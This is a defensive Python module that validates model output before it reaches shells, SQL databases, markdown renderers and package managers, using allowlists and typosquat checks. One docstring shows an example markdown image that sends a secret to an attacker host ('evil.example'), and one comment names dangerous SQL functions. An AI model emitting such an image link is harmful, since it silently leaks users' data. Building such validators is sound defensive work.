"""Deterministic validation of model output bound for execution sinks.

Model output is untrusted input. Before it reaches a shell, a database, a
Markdown renderer or a package manager it is parsed and checked against an
explicit allowlist; nothing is "sanitised by prompt".
"""

from __future__ import annotations

import re
import shlex
from urllib.parse import urlsplit

import sqlglot
from pydantic import BaseModel, ConfigDict, Field
from sqlglot import exp
from sqlglot.errors import SqlglotError

from aegis.core.findings import Finding, Severity

REF_OUTPUT_HANDLING = "OWASP-LLM10:2026"
REF_MISINFORMATION = "OWASP-LLM07:2026"
REF_CODE_EXECUTION = "OWASP-ASI05"

SHELL_METACHARACTERS = frozenset(";|&$`<>\n\r\\(){}*?~!#")
IMAGE_REMOVED_PLACEHOLDER = "[image removed]"
TYPOSQUAT_MAX_DISTANCE = 2
PACKAGE_NAME_MIN_CHARS_FOR_FUZZY = 4


class SinkVerdict(BaseModel):
    allowed: bool
    findings: list[Finding] = Field(default_factory=list)
    # For shell: the argv to run with shell=False. For markdown: cleaned text.
    safe_value: str | list[str] | None = None


def _deny(rule_id: str, message: str, evidence: str, *references: str) -> SinkVerdict:
    finding = Finding.build(
        rule_id, Severity.HIGH, message, evidence=evidence, references=references
    )
    return SinkVerdict(allowed=False, findings=[finding])


# --------------------------------------------------------------------- shell


class ShellPolicy(BaseModel):
    """Binary allowlist with per-binary forbidden arguments."""

    model_config = ConfigDict(frozen=True)

    allowed_binaries: frozenset[str] = frozenset()
    forbidden_arguments: dict[str, frozenset[str]] = Field(default_factory=dict)


def validate_shell_command(command: str, policy: ShellPolicy) -> SinkVerdict:
    """Accept only a single allowlisted binary with no shell metacharacters.

    The returned argv is meant for ``subprocess.run(argv, shell=False)``.
    """
    refs = (REF_OUTPUT_HANDLING, REF_CODE_EXECUTION)
    used = sorted(set(command) & SHELL_METACHARACTERS)
    if used:
        return _deny("AEGIS-SINK-SH-001", "Shell metacharacters", " ".join(used), *refs)
    try:
        argv = shlex.split(command)
    except ValueError as error:
        return _deny("AEGIS-SINK-SH-002", "Unparseable command", str(error), *refs)
    if not argv:
        return _deny("AEGIS-SINK-SH-002", "Empty command", "", *refs)
    binary = argv[0]
    # Paths are rejected so "./ls" or "/tmp/ls" cannot impersonate "ls".
    if "/" in binary or binary not in policy.allowed_binaries:
        return _deny("AEGIS-SINK-SH-003", "Binary not on allowlist", binary, *refs)
    forbidden = policy.forbidden_arguments.get(binary, frozenset())
    for argument in argv[1:]:
        flag = argument.split("=", 1)[0]
        if flag in forbidden:
            return _deny("AEGIS-SINK-SH-004", "Forbidden argument", argument, *refs)
    return SinkVerdict(allowed=True, safe_value=argv)


# ----------------------------------------------------------------------- sql


class SqlPolicy(BaseModel):
    """Which statements and tables model-written SQL may touch."""

    model_config = ConfigDict(frozen=True)

    dialect: str = "postgres"
    allowed_statements: frozenset[str] = frozenset({"select"})
    allowed_tables: frozenset[str] = frozenset()
    # Functions are allowlisted because databases ship ones that read files,
    # sleep, or open network connections (pg_read_file, pg_sleep, dblink).
    allowed_functions: frozenset[str] = frozenset(
        {"count", "sum", "avg", "min", "max", "lower", "upper", "coalesce"}
    )
    require_parameters: bool = True


_FORBIDDEN_SQL_NODES: tuple[type[exp.Expression], ...] = (
    exp.Command,
    exp.Drop,
    exp.Create,
    exp.Alter,
    exp.Grant,
    exp.Into,
    exp.Copy,
)


def _sql_literal_findings(tree: exp.Expr) -> str | None:
    """Return the first inline value in a predicate, or None.

    Values must arrive as bind parameters; an inline literal in WHERE, HAVING
    or a join condition means model text is being concatenated into SQL.
    """
    for clause_type in (exp.Where, exp.Having, exp.Join):
        for clause in tree.find_all(clause_type):
            for literal in clause.find_all(exp.Literal):
                # "$1" parses as a parameter wrapping the literal 1.
                if not isinstance(literal.parent, exp.Parameter | exp.Placeholder):
                    return literal.sql()
    return None


def _function_name(node: exp.Func) -> str:
    name = node.name if isinstance(node, exp.Anonymous) else node.sql_name()
    return name.lower()


def _disallowed_function(tree: exp.Expr, policy: SqlPolicy) -> str | None:
    for node in tree.find_all(exp.Func):
        # AND/OR are modelled as functions by the parser but are operators.
        if isinstance(node, exp.Connector):
            continue
        if _function_name(node) not in policy.allowed_functions:
            return _function_name(node)
    return None


def _sql_violation(tree: exp.Expr, policy: SqlPolicy) -> tuple[str, str, str] | None:
    """First policy violation in a parsed statement as (rule id, message, evidence)."""
    if tree.key not in policy.allowed_statements:
        return ("AEGIS-SINK-SQL-003", "Statement type not allowed", tree.key)
    forbidden = next(tree.find_all(*_FORBIDDEN_SQL_NODES), None)
    if forbidden is not None:
        return ("AEGIS-SINK-SQL-004", "Forbidden construct", forbidden.key)
    tables = {table.name.lower() for table in tree.find_all(exp.Table)}
    unknown = sorted(tables - {name.lower() for name in policy.allowed_tables})
    if unknown:
        return ("AEGIS-SINK-SQL-005", "Table not on allowlist", ", ".join(unknown))
    function = _disallowed_function(tree, policy)
    if function is not None:
        return ("AEGIS-SINK-SQL-007", "Function not on allowlist", function)
    literal = _sql_literal_findings(tree) if policy.require_parameters else None
    if literal is not None:
        return ("AEGIS-SINK-SQL-006", "Inline literal; use bind parameters", literal)
    return None


def validate_sql(query: str, policy: SqlPolicy) -> SinkVerdict:
    """Parse the query and enforce the policy on its AST."""
    refs = (REF_OUTPUT_HANDLING,)
    try:
        statements = [s for s in sqlglot.parse(query, read=policy.dialect) if s is not None]
    except SqlglotError as error:
        return _deny("AEGIS-SINK-SQL-001", "SQL does not parse", str(error), *refs)
    if len(statements) != 1:
        return _deny(
            "AEGIS-SINK-SQL-002", "Exactly one statement allowed", str(len(statements)), *refs
        )
    tree = statements[0]
    violation = _sql_violation(tree, policy)
    if violation is not None:
        return _deny(*violation, *refs)
    return SinkVerdict(allowed=True, safe_value=tree.sql(dialect=policy.dialect))


# ------------------------------------------------------------------ markdown

_MARKDOWN_IMAGE = re.compile(r"!\[[^\]]*\]\(\s*<?([^)\s>]+)>?[^)]*\)")
_REFERENCE_IMAGE = re.compile(r"!\[[^\]]*\]\s*\[[^\]]*\]")
_REFERENCE_DEFINITION = re.compile(r"^\s{0,3}\[[^\]]+\]:\s*\S+.*$", re.MULTILINE)
_HTML_IMAGE = re.compile(r"<\s*img\b[^>]*>", re.IGNORECASE)
_HTML_SRC = re.compile(r"""\bsrc\s*=\s*["']?([^"'\s>]+)""", re.IGNORECASE)


def _host_allowed(url: str, allowed_hosts: frozenset[str]) -> bool:
    parts = urlsplit(url)
    return parts.scheme == "https" and (parts.hostname or "").lower() in allowed_hosts


def strip_untrusted_images(markdown: str, allowed_hosts: frozenset[str]) -> SinkVerdict:
    """Remove images that would make the client fetch an attacker URL.

    Rendering ``![x](https://evil.example/?q=<secret>)`` exfiltrates data with
    no click, so any image whose host is not allowlisted is dropped.
    """
    findings: list[Finding] = []

    def drop(url: str) -> str:
        findings.append(
            Finding.build(
                "AEGIS-SINK-MD-001",
                Severity.HIGH,
                "Image pointing at a non-allowlisted host removed",
                evidence=url,
                references=(REF_OUTPUT_HANDLING, "OWASP-LLM02:2026"),
            )
        )
        return IMAGE_REMOVED_PLACEHOLDER

    def inline(match: re.Match[str]) -> str:
        url = match.group(1)
        return match.group(0) if _host_allowed(url, allowed_hosts) else drop(url)

    def html(match: re.Match[str]) -> str:
        source = _HTML_SRC.search(match.group(0))
        url = source.group(1) if source else ""
        return match.group(0) if _host_allowed(url, allowed_hosts) else drop(url)

    cleaned = _MARKDOWN_IMAGE.sub(inline, markdown)
    cleaned = _HTML_IMAGE.sub(html, cleaned)
    # Reference-style images hide the URL elsewhere in the document; they are
    # removed together with their definitions rather than resolved.
    if _REFERENCE_IMAGE.search(cleaned):
        cleaned = _REFERENCE_IMAGE.sub(lambda m: drop(m.group(0)), cleaned)
        cleaned = _REFERENCE_DEFINITION.sub("", cleaned)
    return SinkVerdict(allowed=not findings, findings=findings, safe_value=cleaned)


# ------------------------------------------------------------------ packages

_INSTALL_COMMAND = re.compile(
    r"\b(?P<manager>pip3?|uv\s+pip|uv|npm|pnpm|yarn|bun)\s+(?:install|add|i)\s+(?P<rest>[^\n`]+)"
)
_ECOSYSTEM_BY_MANAGER = {"pip": "pypi", "pip3": "pypi", "uv": "pypi"}


def normalize_package_name(name: str, ecosystem: str) -> str:
    """PEP 503 normalisation for PyPI; lower-casing for npm."""
    lowered = name.strip().lower()
    return re.sub(r"[-_.]+", "-", lowered) if ecosystem == "pypi" else lowered


def edit_distance(left: str, right: str) -> int:
    """Levenshtein distance, used to spot near-miss package names."""
    previous = list(range(len(right) + 1))
    for row, left_char in enumerate(left, start=1):
        current = [row]
        for column, right_char in enumerate(right, start=1):
            substitution = previous[column - 1] + (left_char != right_char)
            current.append(min(previous[column] + 1, current[column - 1] + 1, substitution))
        previous = current
    return previous[-1]


def extract_package_recommendations(text: str) -> list[tuple[str, str]]:
    """Find ``(ecosystem, package)`` pairs in install commands the model wrote."""
    found: list[tuple[str, str]] = []
    for match in _INSTALL_COMMAND.finditer(text):
        manager = match.group("manager").split()[0]
        ecosystem = _ECOSYSTEM_BY_MANAGER.get(manager, "npm")
        for token in match.group("rest").split():
            if token.startswith("-"):
                continue
            # Drop version specifiers and extras: requests==2.0, pkg[extra], pkg@1.
            name = re.split(r"[=<>!~\[;]|(?<!^)@", token, maxsplit=1)[0]
            if name:
                found.append((ecosystem, normalize_package_name(name, ecosystem)))
    return found


class PackageAllowlist:
    """Trusted registry snapshot used to stop slopsquatting.

    Models hallucinate plausible package names; attackers register them. A
    name is accepted only if it is on the organisation's allowlist.
    """

    def __init__(self, packages: dict[str, frozenset[str]]) -> None:
        self._packages = {
            ecosystem: frozenset(normalize_package_name(name, ecosystem) for name in names)
            for ecosystem, names in packages.items()
        }

    def _nearest(self, name: str, ecosystem: str) -> str | None:
        if len(name) < PACKAGE_NAME_MIN_CHARS_FOR_FUZZY:
            return None
        for candidate in sorted(self._packages.get(ecosystem, frozenset())):
            if edit_distance(name, candidate) <= TYPOSQUAT_MAX_DISTANCE:
                return candidate
        return None

    def verify(self, name: str, ecosystem: str) -> SinkVerdict:
        normalized = normalize_package_name(name, ecosystem)
        if normalized in self._packages.get(ecosystem, frozenset()):
            return SinkVerdict(allowed=True, safe_value=normalized)
        nearest = self._nearest(normalized, ecosystem)
        if nearest is not None:
            return _deny(
                "AEGIS-SINK-PKG-002",
                f"Possible typosquat of {nearest!r}",
                normalized,
                REF_MISINFORMATION,
                "OWASP-LLM04:2026",
            )
        return _deny(
            "AEGIS-SINK-PKG-001",
            "Package not in trusted registry allowlist",
            normalized,
            REF_MISINFORMATION,
            "OWASP-LLM04:2026",
        )

    def verify_text(self, text: str) -> SinkVerdict:
        """Check every install command in a model response."""
        findings: list[Finding] = []
        for ecosystem, name in extract_package_recommendations(text):
            findings.extend(self.verify(name, ecosystem).findings)
        return SinkVerdict(allowed=not findings, findings=findings)
